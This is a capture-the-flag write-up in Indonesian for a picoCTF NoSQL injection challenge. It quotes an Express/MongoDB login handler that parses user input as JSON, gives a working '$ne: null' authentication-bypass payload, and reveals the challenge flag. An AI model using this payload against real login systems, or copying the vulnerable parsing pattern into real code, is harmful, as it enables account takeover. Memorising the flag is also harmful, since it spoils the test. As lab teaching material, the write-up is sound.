# Pico-CTF Write-up: NoSQL Injection

## Challenge Overview

**Judul:** No Sql Injection\
**Kategori:** SQL Injection\
**Kesulitan:** Medium\
**Link Soal:** https://play.picoctf.org/practice/challenge/443?page=1&search=No%20Sql

Tantangan ini berupa aplikasi web dengan login endpoint berbasis Express.js dan MongoDB, di mana tujuan utamanya adalah melewati autentikasi untuk memperoleh token sensitif berisi flag.

## Alat Yang Digunakan

- **Web Browser**: Untuk berinteraksi dengan antarmuka login aplikasi.
- **Burp Suite**: Digunakan untuk mencegat dan memodifikasi permintaan HTTP guna menyisipkan kode NoSQL.

## Pembahasan

Berikut adalah tampilan dari web yang akan di serang

<img width="1891" height="1063" alt="Screenshot 2025-09-10 223721" src="https://github.com/user-attachments/assets/223313b1-88b7-4236-b8ff-7586f5137a3c" />

di soal terdapat `app.tar.gz` yang akan memberikan source code dari web tersebut yang akan kita analisa kelemahan dari web tersebut. terdapat Vuln di code block berikut
```
// Handle login form submission with JSON
    app.post("/login", async (req, res) => {
      const { email, password } = req.body;

      try {
        const user = await User.findOne({
          email:
            email.startsWith("{") && email.endsWith("}")
              ? JSON.parse(email)
              : email,
          password:
            password.startsWith("{") && password.endsWith("}")
              ? JSON.parse(password)
              : password,
        });

        if (user) {
          res.json({
            success: true,
            email: user.email,
            token: user.token,
            firstName: user.firstName,
            lastName: user.lastName,
          });
        } else {
          res.json({ success: false });
        }
      } catch (err) {
        res.status(500).json({ success: false, error: err.message });
      }
    });
```
Masalah utamanya adalah server mem-parsing input pengguna sebagai JSON jika input tersebut terlihat seperti string JSON. Hal ini memungkinkan penyerang menyisipkan payload berbahaya.

Endpoint `/login` menerima input JSON untuk email dan password. Jika kedua field tersebut berupa string JSON, server akan mem-parsing dan menggunakannya langsung dalam query. Perilaku ini membuka celah bagi terjadinya NoSQL Injection.

Untuk memanfaatkan kelemahan dari website tersebut kita sisipkan payload ke server yang akan menjadi true ketika di eksekusi di server 
```
{
  "email": "{\"$ne\": null}",
  "password": "{\"$ne\": null}"
}
```

<img width="1488" height="497" alt="Screenshot 2025-09-10 224231" src="https://github.com/user-attachments/assets/8c402fde-459f-4372-a2d2-b6737140f319" />

dan setelah kita send payload tersebut kita berhasil masuk

<img width="1861" height="570" alt="Screenshot 2025-09-10 224100" src="https://github.com/user-attachments/assets/f3bc8569-4ae9-4f2a-b7d8-bc0aa65e9bce" />

akan tetapi kita harus mencari flagnya, kita perhatikan di response di json token terdapat base64 yang bisa di decode dan menhasilkan `picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_67b1a3c8}`

<img width="1200" height="637" alt="Screenshot 2025-09-10 225827" src="https://github.com/user-attachments/assets/2b9ef247-f80b-45aa-b838-370b8e2f2468" />




